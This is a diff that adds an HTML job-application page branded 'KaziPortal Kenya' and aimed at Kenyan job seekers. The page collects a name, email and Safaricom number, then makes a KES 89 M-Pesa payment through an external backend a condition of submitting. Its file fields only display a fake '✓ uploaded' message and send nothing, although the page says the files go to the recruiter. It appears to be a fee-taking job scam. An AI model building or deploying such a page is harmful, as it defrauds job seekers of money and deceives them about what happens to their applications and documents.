@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Application Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-msg {
+            color: #22c55e;
+            font-size: 0.75rem;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body class="bg-purple-50 min-h-screen py-8 px-4">
+
+    <div class="max-w-2xl mx-auto space-y-4">
+        
+        <div class="bg-white rounded-t-lg border-t-[10px] border-purple-700 shadow-sm overflow-hidden">
+            <div class="p-6">
+                <h1 class="text-3xl font-normal text-gray-900 mb-2">Job Application</h1>
+                <p class="text-sm text-gray-700 mb-4">Please provide your contact details. Attachments below are for your own record and will  be sent to recruiter alone.</p>
+                <hr class="border-gray-200">
+                <p class="text-red-500 text-xs mt-3 font-medium">* Indicates required question</p>
+            </div>
+        </div>
+
+        <form id="jobForm" class="space-y-3">
+            
+            <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+                <label class="block text-base font-medium text-gray-900 mb-4">
+                    Full Name <span class="text-red-500">*</span>
+                </label>
+                <input type="text" name="name" placeholder="Your answer" required 
+                    class="w-full border-b border-gray-300 py-2 focus:border-b-2 focus:border-purple-700 outline-none transition-all">
+            </div>
+
+            <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+                <label class="block text-base font-medium text-gray-900 mb-4">
+                    Email Address <span class="text-red-500">*</span>
+                </label>
+                <input type="email" name="email" placeholder="Your email" required 
+                    class="w-full border-b border-gray-300 py-2 focus:border-b-2 focus:border-purple-700 outline-none transition-all">
+            </div>
+
+            <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+                <label class="block text-base font-medium text-gray-900 mb-4">
+                    Phone Number (safaricom) <span class="text-red-500">*</span>
+                </label>
+                <input type="tel" name="phone" placeholder="07XX XXX XXX" required 
+                    class="w-full border-b border-gray-300 py-2 focus:border-b-2 focus:border-purple-700 outline-none transition-all">
+            </div>
+
+            <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+                <label class="block text-base font-medium text-gray-900 mb-2">
+                    Upload CV (Optional)
+                </label>
+                <p class="text-xs text-gray-500 mb-4 italic">Note: Files selected here are uploaded to recruiter.</p>
+                <div class="flex items-center gap-2">
+                    <label class="cursor-pointer bg-gray-100 hover:bg-gray-200 text-gray-700 px-4 py-2 rounded border border-gray-300 text-sm font-medium">
+                        <i data-lucide="upload" class="w-4 h-4 inline mr-1"></i> Add file
+                        <input type="file" class="hidden" onchange="handleFileSelect(this, 'cvStatus')">
+                    </label>
+                    <span id="cvStatus" class="text-xs text-gray-400">No file chosen</span>
+                </div>
+            </div>
+
+            <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+                <label class="block text-base font-medium text-gray-900 mb-2">
+                    Academic Certificates (Optional)
+                </label>
+                <div class="flex items-center gap-2">
+                    <label class="cursor-pointer bg-gray-100 hover:bg-gray-200 text-gray-700 px-4 py-2 rounded border border-gray-300 text-sm font-medium">
+                        <i data-lucide="plus" class="w-4 h-4 inline mr-1"></i> Add files
+                        <input type="file" multiple class="hidden" onchange="handleFileSelect(this, 'certStatus')">
+                    </label>
+                    <span id="certStatus" class="text-xs text-gray-400">No files chosen</span>
+                </div>
+            </div>
+
+            <div class="flex items-center justify-between py-4">
+                <button type="button" id="submitBtn"
+                    class="bg-purple-700 hover:bg-purple-800 text-white font-medium px-10 py-2.5 rounded shadow-sm transition active:scale-95">
+                    Submit
+                </button>
+                <span class="text-xs text-gray-500">Page 1 of 1</span>
+            </div>
+
+        </form>
+
+        <footer class="text-center py-6">
+            <p class="text-xs text-gray-500 italic">This form was created for Kenyan job seekers only.</p>
+            <p class="text-[10px] text-gray-400 uppercase mt-2 tracking-widest font-bold">KaziPortal Kenya</p>
+        </footer>r co
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="modal-overlay">
+        <div class="modal-card">
+            <h2 class="text-xl font-bold text-gray-800 mb-2">Pay KES 89 to Submit</h2>
+            <p class="text-sm text-gray-600 mb-4">Payment will be sent to your registered number</p>
+            
+            <span class="text-2xl font-bold text-purple-700 block mb-4">KES 89.00</span>
+            
+            <div id="displayPhone" class="text-lg font-medium text-gray-700 mb-4"></div>
+            
+            <input type="tel" id="mpesaPhone" placeholder="Enter different number (optional)" 
+                class="w-full border-2 border-gray-300 rounded-lg py-2 px-3 text-base focus:border-purple-700 outline-none mb-2">
+            <button type="button" id="changePhoneBtn" onclick="changePhoneNumber()" 
+                class="text-purple-600 text-sm hover:underline mb-4 hidden">
+                Use this number for payment
+            </button>
+            
+            <button id="payBtn" onclick="handlePayment()"
+                class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg mt-4 transition">
+                Pay with M-Pesa
+            </button>
+
+            <div id="paymentStatus" class="mt-4 text-sm min-h-[20px]"></div>
+            
+            <button type="button" id="cancelPaymentBtn" onclick="cancelPayment()" class="text-red-500 text-sm mt-2 hover:underline hidden">
+                Cancel & Change Number
+            </button>
+            
+            <button onclick="closePaymentModal()" class="text-gray-500 text-sm mt-3 hover:underline">
+                Cancel
+            </button>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal-overlay">
+        <div class="modal-card">
+            <div class="text-green-500 text-5xl mb-4">✓</div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Application Received!</h2>
+            <p class="text-gray-600">Your application has been submitted successfully.</p>
+            <p class="text-sm text-gray-500 mt-4">Check your email and WhatsApp for confirmation.</p>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+    </script>
+
+    <script>
+        const BACKEND_URL = "https://newpayment-srpu.onrender.com";
+        let pollTimer;
+
+        function handleFileSelect(input, statusId) {
+            const statusSpan = document.getElementById(statusId);
+            if (input.files && input.files.length > 0) {
+                const names = input.files.length > 1 
+                    ? input.files.length + ' files selected'
+                    : input.files[0].name;
+                statusSpan.innerHTML = names + '<span class="success-msg">✓ uploaded</span>';
+            }
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const form = document.getElementById('jobForm');
+            const inputs = form.querySelectorAll('input[required]');
+            let valid = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) valid = false;
+            });
+            
+            if (!valid) {
+                alert('Please fill in all required fields');
+                return;
+            }
+            
+            const phoneInput = document.querySelector('input[name="phone"]').value;
+            document.getElementById('displayPhone').textContent = phoneInput;
+            document.getElementById('mpesaPhone').value = '';
+            document.getElementById('changePhoneBtn').classList.add('hidden');
+            
+            document.getElementById('paymentModal').classList.add('active');
+        });
+
+        function changePhoneNumber() {
+            const newPhone = document.getElementById('mpesaPhone').value;
+            if (newPhone && newPhone.length >= 10) {
+                document.getElementById('displayPhone').textContent = newPhone;
+                document.getElementById('changePhoneBtn').classList.add('hidden');
+                document.getElementById('mpesaPhone').value = '';
+            } else {
+                alert('Please enter a valid phone number');
+            }
+        }
+
+        document.getElementById('mpesaPhone').addEventListener('input', function() {
+            if (this.value.length >= 10) {
+                document.getElementById('changePhoneBtn').classList.remove('hidden');
+            } else {
+                document.getElementById('changePhoneBtn').classList.add('hidden');
+            }
+        });
+
+        function closePaymentModal() {
+            document.getElementById('paymentModal').classList.remove('active');
+            clearInterval(pollTimer);
+            resetPayment();
+        }
+
+        async function handlePayment() {
+            const phone = document.getElementById('displayPhone').textContent;
+            const statusDiv = document.getElementById('paymentStatus');
+            const payBtn = document.getElementById('payBtn');
+
+            if (!phone || phone.length < 10) {
+                alert("Please enter a valid phone number (e.g., 07XX...)");
+                return;
+            }
+
+            payBtn.disabled = true;
+            payBtn.innerHTML = '<span class="loader"></span>Processing...';
+            statusDiv.style.color = "#555";
+            statusDiv.innerText = "Requesting payment prompt...";
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/initiate`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        amount: 89, 
+                        phone_number: phone 
+                    })
+                });
+
+                const data = await response.json();
+                const invoiceId = data.invoice ? data.invoice.invoice_id : (data.id || null);
+
+                if (invoiceId) {
+                    statusDiv.innerText = "Enter M-Pesa PIN on your phone. Don't refresh!";
+                    document.getElementById('cancelPaymentBtn').classList.remove('hidden');
+                    startPolling(invoiceId);
+                } else {
+                    throw new Error(data.error || "Failed to initiate payment");
+                }
+            } catch (err) {
+                statusDiv.style.color = "red";
+                statusDiv.innerText = "Error: " + err.message;
+                resetPayment();
+            }
+        }
+
+        async function startPolling(invoiceId) {
+            const statusDiv = document.getElementById('paymentStatus');
+            
+            pollTimer = setInterval(async () => {
+                try {
+                    const response = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
+                    const data = await response.json();
+                    const state = data.invoice ? data.invoice.state : data.state;
+
+                    if (state === "COMPLETE" || state === "COMPLETED") {
+                        clearInterval(pollTimer);
+                        statusDiv.style.color = "green";
+                        statusDiv.innerHTML = "<strong>Payment Successful!</strong>";
+                        
+                        setTimeout(() => {
+                            document.getElementById('paymentModal').classList.remove('active');
+                            document.getElementById('successModal').classList.add('active');
+                        }, 1500);
+                    } else if (state === "FAILED" || state === "REJECTED") {
+                        clearInterval(pollTimer);
+                        statusDiv.style.color = "red";
+                        statusDiv.innerText = "Payment cancelled";
+                        resetPayment();
+                    }
+                } catch (err) {
+                    console.error("Polling error:", err);
+                }
+            }, 3000);
+        }
+
+        function resetPayment() {
+            const payBtn = document.getElementById('payBtn');
+            payBtn.disabled = false;
+            payBtn.innerHTML = 'Pay with M-Pesa';
+            document.getElementById('cancelPaymentBtn').classList.add('hidden');
+        }
+
+        function cancelPayment() {
+            clearInterval(pollTimer);
+            resetPayment();
+            document.getElementById('paymentStatus').innerText = '';
+        }
+    </script>
+</body>
+</html>
